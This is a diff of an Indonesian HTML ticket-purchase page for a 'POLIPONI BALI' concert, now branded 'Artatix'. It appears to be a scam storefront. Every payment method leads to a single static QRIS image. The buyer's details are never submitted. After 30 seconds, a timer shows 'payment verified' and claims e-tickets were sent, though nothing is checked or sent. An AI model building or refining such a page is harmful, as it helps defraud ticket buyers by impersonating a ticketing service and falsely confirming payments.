@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>POLIPONI BALI</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>POLIPONI BALI - Ticket Form</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
+
 *{
 margin:0;
 padding:0;
@@ -15,23 +17,55 @@ font-family:'Poppins',sans-serif;
 }
 
 body{
-background:#f4f4f4;
+background:#f3f5fb;
 color:#111;
 }
 
-.container{
-max-width:480px;
-margin:auto;
-background:white;
-min-height:100vh;
+/* HEADER */
+
+.header{
+height:82px;
+background:#0038d9;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:0 30px;
+position:sticky;
+top:0;
+z-index:1000;
 }
 
+.logo{
+font-size:34px;
+font-weight:800;
+color:#fff;
+}
+
+.header-right{
+display:flex;
+gap:14px;
+align-items:center;
+}
+
+.circle{
+width:50px;
+height:50px;
+border-radius:50%;
+background:#1f57ff;
+display:flex;
+align-items:center;
+justify-content:center;
+color:white;
+font-size:20px;
+}
+
+/* BANNER */
+
 .banner{
-position:relative;
-height:340px;
+width:100%;
+height:420px;
 overflow:hidden;
-border-bottom-left-radius:30px;
-border-bottom-right-radius:30px;
+background:#ddd;
 }
 
 .banner img{
@@ -40,401 +74,671 @@ height:100%;
 object-fit:cover;
 }
 
-.overlay{
-position:absolute;
-inset:0;
-background:linear-gradient(to top, rgba(0,0,0,.95), rgba(0,0,0,.2));
-display:flex;
-align-items:flex-end;
-padding:25px;
+/* CONTAINER */
+
+.container{
+max-width:1400px;
+margin:auto;
+padding:30px;
 }
 
-.overlay-content h1{
-color:white;
-font-size:38px;
-font-weight:800;
-line-height:1;
-margin-bottom:10px;
-}
-
-.overlay-content p{
-color:#ddd;
-font-size:15px;
-margin-top:5px;
-}
+/* STEP */
 
 .steps{
-background:#050505;
-padding:20px;
-display:grid;
-grid-template-columns:1fr 1fr;
-gap:12px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:30px;
+gap:10px;
+flex-wrap:wrap;
 }
 
 .step{
-background:#151515;
-color:#888;
+flex:1;
+min-width:120px;
+background:white;
 padding:15px;
+border-radius:14px;
 text-align:center;
-border-radius:18px;
 font-weight:600;
+border:2px solid #e6e6e6;
+transition:.3s;
 }
 
 .step.active{
-background:linear-gradient(135deg,#00bfff,#0047ff);
+background:#0038d9;
 color:white;
-box-shadow:0 0 20px rgba(0,119,255,.5);
+border-color:#0038d9;
 }
 
-.content{
+/* GRID */
+
+.grid{
+display:grid;
+grid-template-columns:1fr 1fr 1fr 350px;
+gap:20px;
+align-items:start;
+}
+
+.card{
+background:white;
+border-radius:20px;
 padding:24px;
+box-shadow:0 8px 25px rgba(0,0,0,.05);
 }
 
-.section-title{
-font-size:34px;
-font-weight:800;
-margin-bottom:20px;
-}
-
-.ticket-card{
-background:#0d0d0d;
-border-radius:28px;
-padding:25px;
-color:white;
-margin-bottom:20px;
-box-shadow:0 10px 30px rgba(0,0,0,.2);
-}
-
-.ticket-card h3{
-font-size:28px;
-margin-bottom:15px;
-}
-
-.price{
-font-size:52px;
-font-weight:800;
-color:#00d5ff;
-margin-bottom:15px;
-}
-
-.ticket-card button{
-width:100%;
-padding:16px;
-border:none;
-border-radius:16px;
-background:linear-gradient(135deg,#00c6ff,#0047ff);
-color:white;
-font-size:17px;
+.card-title{
+font-size:22px;
 font-weight:700;
-cursor:pointer;
+margin-bottom:20px;
+color:#0038d9;
 }
 
-.form-group{
-margin-bottom:18px;
-}
+/* TICKET */
 
-.form-group label{
-display:block;
-font-weight:600;
-margin-bottom:8px;
-}
-
-.form-group input,
-.form-group select,
-.form-group textarea{
-width:100%;
-padding:16px;
+.ticket{
+border:2px solid #ececec;
 border-radius:16px;
-border:2px solid #e5e5e5;
+padding:18px;
+margin-bottom:15px;
+cursor:pointer;
+transition:.3s;
+}
+
+.ticket:hover{
+border-color:#0038d9;
+}
+
+.ticket.active{
+border-color:#0038d9;
+background:#f2f6ff;
+}
+
+.ticket-top{
+display:flex;
+justify-content:space-between;
+font-weight:700;
+font-size:20px;
+}
+
+.ticket-sub{
+margin-top:5px;
+color:#666;
+font-size:14px;
+}
+
+/* INPUT */
+
+.input-group{
+margin-bottom:16px;
+}
+
+.input-group label{
+display:block;
+margin-bottom:7px;
+font-weight:600;
+}
+
+.input-group input,
+.input-group select{
+width:100%;
+height:52px;
+border-radius:12px;
+border:1px solid #ddd;
+padding:0 15px;
 font-size:15px;
 outline:none;
 }
 
-.form-group input:focus,
-.form-group select:focus,
-.form-group textarea:focus{
-border-color:#0066ff;
+.input-group input:focus,
+.input-group select:focus{
+border-color:#0038d9;
 }
 
-.next-btn,
-.pay-btn{
+/* PAYMENT */
+
+.payment-option{
+border:2px solid #ececec;
+padding:15px;
+border-radius:14px;
+margin-bottom:12px;
+cursor:pointer;
+transition:.3s;
+}
+
+.payment-option.active{
+border-color:#0038d9;
+background:#f2f6ff;
+}
+
+.payment-title{
+font-weight:700;
+}
+
+/* SUMMARY */
+
+.summary-line{
+display:flex;
+justify-content:space-between;
+margin-bottom:12px;
+font-size:15px;
+}
+
+.total{
+font-size:34px;
+font-weight:800;
+margin-top:20px;
+color:#0038d9;
+}
+
+.btn{
 width:100%;
-padding:18px;
+height:58px;
 border:none;
-border-radius:18px;
-background:linear-gradient(135deg,#00c6ff,#0047ff);
+border-radius:16px;
+background:#0038d9;
 color:white;
-font-size:17px;
+font-size:18px;
 font-weight:700;
 cursor:pointer;
-margin-top:10px;
+margin-top:20px;
+transition:.3s;
+}
+
+.btn:hover{
+transform:translateY(-2px);
+}
+
+/* MODAL QRIS */
+
+.modal{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,.75);
+display:none;
+align-items:center;
+justify-content:center;
+padding:20px;
+z-index:99999;
+}
+
+.modal-box{
+width:100%;
+max-width:480px;
+background:white;
+border-radius:28px;
+overflow:hidden;
+animation:show .3s ease;
+}
+
+@keyframes show{
+from{
+transform:translateY(20px);
+opacity:0;
+}
+to{
+transform:translateY(0);
+opacity:1;
+}
+}
+
+.modal-header{
+background:#0038d9;
+padding:25px;
+color:white;
+text-align:center;
+}
+
+.modal-header h2{
+font-size:28px;
+}
+
+.modal-content{
+padding:30px;
+text-align:center;
 }
 
 .qris-box{
-background:#0d0d0d;
-padding:25px;
-border-radius:28px;
-text-align:center;
-color:white;
+border:4px dashed #0038d9;
+padding:20px;
+border-radius:24px;
+margin-bottom:20px;
 }
 
 .qris-box img{
 width:100%;
-max-width:300px;
-background:white;
-padding:10px;
-border-radius:20px;
-margin-top:15px;
+max-width:280px;
 }
 
 .timer{
-font-size:32px;
+font-size:38px;
 font-weight:800;
-margin-top:20px;
-color:#00d5ff;
+color:#ff2a2a;
+margin-bottom:20px;
 }
 
 .upload-box{
-margin-top:25px;
-text-align:left;
+margin-top:20px;
 }
 
 .upload-box input{
-margin-top:10px;
 width:100%;
 padding:12px;
-background:white;
+border:1px solid #ddd;
 border-radius:12px;
 }
 
-.loading-screen,
-.success-screen{
+/* LOADING */
+
+.loading{
+display:none;
 position:fixed;
 inset:0;
-background:#050505;
-display:none;
+background:white;
+z-index:999999;
 align-items:center;
 justify-content:center;
 flex-direction:column;
-color:white;
-z-index:999;
-padding:20px;
-text-align:center;
 }
 
 .loader{
 width:90px;
 height:90px;
-border:8px solid rgba(255,255,255,.1);
-border-top:8px solid #00c6ff;
+border:8px solid #eee;
+border-top:8px solid #0038d9;
 border-radius:50%;
 animation:spin 1s linear infinite;
-margin-bottom:30px;
+margin-bottom:25px;
 }
 
 @keyframes spin{
-100%{transform:rotate(360deg)}
+100%{
+transform:rotate(360deg);
+}
 }
 
-.success-icon{
-font-size:90px;
-margin-bottom:20px;
-}
-
-.success-screen h1{
-font-size:42px;
+.loading h1{
+font-size:32px;
 margin-bottom:10px;
 }
 
-.hidden{
+/* SUCCESS */
+
+.success{
 display:none;
+padding:100px 20px;
+text-align:center;
 }
 
-@media(max-width:480px){
-.overlay-content h1{
-font-size:32px;
+.success h1{
+font-size:48px;
+color:#0038d9;
+margin-bottom:15px;
 }
 
-.section-title{
-font-size:28px;
+.success p{
+font-size:18px;
+color:#555;
 }
 
-.price{
-font-size:42px;
+/* MOBILE */
+
+@media(max-width:1200px){
+
+.grid{
+grid-template-columns:1fr;
 }
+
+.banner{
+height:240px;
 }
+
+}
+
 </style>
 </head>
 <body>
 
-<div class="container">
+<!-- HEADER -->
+
+<div class="header">
+<div class="logo">Artatix</div>
+
+<div class="header-right">
+<div class="circle">ID</div>
+<div class="circle">⌕</div>
+<div class="circle">☰</div>
+</div>
+</div>
+
+<!-- BANNER -->
 
 <div class="banner">
-<img src="bannerr.png" alt="Banner">
-<div class="overlay">
-<div class="overlay-content">
-<h1>POLIPONI BALI</h1>
-<p>Bali United Training Center | Bali</p>
-<p>Live Concert & Festival Experience</p>
+<img src="banner.png">
 </div>
-</div>
-</div>
+
+<!-- MAIN -->
+
+<div class="container" id="mainPage">
 
 <div class="steps">
 <div class="step active">1. Tiket</div>
-<div class="step">2. Pemesan</div>
-<div class="step">3. Pengunjung</div>
-<div class="step">4. Pembayaran</div>
-<div class="step" style="grid-column:span 2;">5. E-Ticket</div>
+<div class="step active">2. Pemesan</div>
+<div class="step active">3. Pengunjung</div>
+<div class="step active">4. Pembayaran</div>
+<div class="step active">5. Konfirmasi</div>
 </div>
 
-<div class="content">
+<div class="grid">
 
-<div id="ticketPage">
-<h2 class="section-title">Pilih Tiket</h2>
+<!-- TICKET -->
 
-<div class="ticket-card">
-<h3>Festival</h3>
-<div class="price">Rp250K</div>
-<p style="color:#aaa;margin-bottom:20px;">
-Akses konser festival premium.
-</p>
-<button onclick="nextToForm()">Pilih Tiket</button>
+<div class="card">
+
+<div class="card-title">
+Pilih Tiket
+</div>
+
+<div class="ticket active">
+<div class="ticket-top">
+<span>Festival</span>
+<span>Rp450K</span>
+</div>
+
+<div class="ticket-sub">
+Presale 1
 </div>
 </div>
 
-<div id="formPage" class="hidden">
-<h2 class="section-title">Data Pemesan</h2>
-
-<div class="form-group">
-<label>Nama Lengkap</label>
-<input type="text" id="nama" required>
+<div class="ticket">
+<div class="ticket-top">
+<span>VIP</span>
+<span>Rp750K</span>
 </div>
 
-<div class="form-group">
-<label>Email</label>
-<input type="email" id="email" required>
+<div class="ticket-sub">
+Presale 1
+</div>
 </div>
 
-<div class="form-group">
-<label>Nomor WhatsApp</label>
-<input type="number" id="wa" required>
+<div class="ticket">
+<div class="ticket-top">
+<span>VVIP</span>
+<span>Rp1.250K</span>
 </div>
 
-<div class="form-group">
-<label>Metode Pembayaran</label>
-<select id="metode" required>
-<option value="">Pilih Pembayaran</option>
-<option>DANA</option>
-<option>OVO</option>
-<option>GoPay</option>
-<option>ShopeePay</option>
-<option>Transfer Bank</option>
+<div class="ticket-sub">
+Presale 1
+</div>
+</div>
+
+</div>
+
+<!-- PEMESAN -->
+
+<div class="card">
+
+<div class="card-title">
+Data Pemesan
+</div>
+
+<div class="input-group">
+<label>Nama Lengkap *</label>
+<input type="text" required>
+</div>
+
+<div class="input-group">
+<label>Email *</label>
+<input type="email" required>
+</div>
+
+<div class="input-group">
+<label>Nomor WhatsApp *</label>
+<input type="number" required>
+</div>
+
+<div class="input-group">
+<label>Kota *</label>
+<select required>
+<option value="">Pilih Kota</option>
+<option>Bali</option>
+<option>Jakarta</option>
+<option>Bandung</option>
 </select>
 </div>
 
-<button class="next-btn" onclick="goPayment()">Lanjut Pembayaran</button>
 </div>
 
-<div id="paymentPage" class="hidden">
-<h2 class="section-title">Pembayaran QRIS</h2>
+<!-- PAYMENT -->
+
+<div class="card">
+
+<div class="card-title">
+Metode Pembayaran
+</div>
+
+<div class="payment-option active">
+<div class="payment-title">
+QRIS
+</div>
+<div>
+Semua pembayaran menuju QRIS
+</div>
+</div>
+
+<div class="payment-option">
+<div class="payment-title">
+Transfer Bank
+</div>
+<div>
+Tetap diarahkan ke QRIS
+</div>
+</div>
+
+<div class="payment-option">
+<div class="payment-title">
+E-Wallet
+</div>
+<div>
+Tetap diarahkan ke QRIS
+</div>
+</div>
+
+</div>
+
+<!-- SUMMARY -->
+
+<div class="card">
+
+<div class="card-title">
+Ringkasan
+</div>
+
+<div class="summary-line">
+<span>Event</span>
+<span>POLIPONI BALI</span>
+</div>
+
+<div class="summary-line">
+<span>Tiket</span>
+<span>Festival</span>
+</div>
+
+<div class="summary-line">
+<span>Jumlah</span>
+<span>2</span>
+</div>
+
+<div class="summary-line">
+<span>Subtotal</span>
+<span>Rp900.000</span>
+</div>
+
+<div class="summary-line">
+<span>Admin</span>
+<span>Rp15.000</span>
+</div>
+
+<div class="total">
+Rp915.000
+</div>
+
+<button class="btn" onclick="openPayment()">
+LANJUTKAN PEMBAYARAN
+</button>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- MODAL QRIS -->
+
+<div class="modal" id="paymentModal">
+
+<div class="modal-box">
+
+<div class="modal-header">
+<h2>POLIPONI BALI</h2>
+<p>Scan QRIS untuk pembayaran</p>
+</div>
+
+<div class="modal-content">
+
+<div class="timer" id="timer">
+15:00
+</div>
 
 <div class="qris-box">
-<h3>Scan QRIS Pembayaran</h3>
-<img src="qris-bayar.png" alt="QRIS">
+<img src="qris-bayar.png">
+</div>
 
-<div class="timer" id="countdown">30:00</div>
+<h3 style="margin-bottom:10px;">
+Upload Bukti Pembayaran
+</h3>
 
 <div class="upload-box">
-<label>Upload Bukti Pembayaran</label>
-<input type="file" id="bukti" required>
+<input type="file" required>
 </div>
 
-<button class="pay-btn" onclick="finishPayment()">
-Saya Sudah Bayar
+<button class="btn" onclick="startLoading()">
+SAYA SUDAH BAYAR
 </button>
-</div>
+
 </div>
 
 </div>
+
 </div>
 
-<div class="loading-screen" id="loadingScreen">
+<!-- LOADING -->
+
+<div class="loading" id="loadingPage">
+
 <div class="loader"></div>
-<h2>Memverifikasi Pembayaran...</h2>
-<p>Mohon tunggu 30 detik</p>
+
+<h1>Memverifikasi Pembayaran</h1>
+
+<p>
+Mohon tunggu sekitar 30 detik...
+</p>
+
 </div>
 
-<div class="success-screen" id="successScreen">
-<div class="success-icon">✅</div>
-<h1>Pembayaran Berhasil</h1>
-<p>E-Ticket berhasil dibuat</p>
+<!-- SUCCESS -->
+
+<div class="success" id="successPage">
+
+<h1>PEMBAYARAN BERHASIL</h1>
+
+<p>
+E-Ticket berhasil dikirim ke Email & WhatsApp
+</p>
+
 </div>
 
 <script>
-function nextToForm(){
-document.getElementById('ticketPage').classList.add('hidden');
-document.getElementById('formPage').classList.remove('hidden');
-}
 
-function goPayment(){
-let nama=document.getElementById('nama').value;
-let email=document.getElementById('email').value;
-let wa=document.getElementById('wa').value;
-let metode=document.getElementById('metode').value;
+function openPayment(){
 
-if(!nama || !email || !wa || !metode){
-alert('Semua form wajib diisi!');
+const requiredInputs = document.querySelectorAll('input[required], select[required]');
+
+for(let input of requiredInputs){
+
+if(!input.value){
+
+alert('Semua data wajib diisi');
+
+input.focus();
+
 return;
+
 }
 
-document.getElementById('formPage').classList.add('hidden');
-document.getElementById('paymentPage').classList.remove('hidden');
-startCountdown();
 }
 
-let countdownStarted=false;
+document.getElementById('paymentModal').style.display='flex';
 
-function startCountdown(){
-if(countdownStarted) return;
-countdownStarted=true;
+startTimer();
 
-let time=1800;
-let countdown=document.getElementById('countdown');
+}
 
-let interval=setInterval(()=>{
-let minutes=Math.floor(time/60);
-let seconds=time%60;
+let duration = 900;
 
-countdown.innerHTML=
-String(minutes).padStart(2,'0')+
-':' +
-String(seconds).padStart(2,'0');
+let timerStarted = false;
 
-if(time<=0){
+function startTimer(){
+
+if(timerStarted) return;
+
+timerStarted = true;
+
+const timer = document.getElementById('timer');
+
+const interval = setInterval(()=>{
+
+let minutes = Math.floor(duration / 60);
+let seconds = duration % 60;
+
+seconds = seconds < 10 ? '0'+seconds : seconds;
+
+timer.innerHTML = minutes + ':' + seconds;
+
+duration--;
+
+if(duration < 0){
+
 clearInterval(interval);
-countdown.innerHTML='EXPIRED';
+
+timer.innerHTML = 'EXPIRED';
+
 }
 
-time--;
 },1000);
+
 }
 
-function finishPayment(){
-let bukti=document.getElementById('bukti').files.length;
+function startLoading(){
 
-if(!bukti){
-alert('Upload bukti pembayaran terlebih dahulu!');
-return;
-}
+document.getElementById('paymentModal').style.display='none';
 
-document.getElementById('loadingScreen').style.display='flex';
+document.getElementById('loadingPage').style.display='flex';
 
 setTimeout(()=>{
-document.getElementById('loadingScreen').style.display='none';
-document.getElementById('successScreen').style.display='flex';
+
+document.getElementById('loadingPage').style.display='none';
+
+document.getElementById('mainPage').style.display='none';
+
+document.getElementById('successPage').style.display='block';
+
+window.scrollTo(0,0);
+
 },30000);
+
 }
+
 </script>
 
 </body>
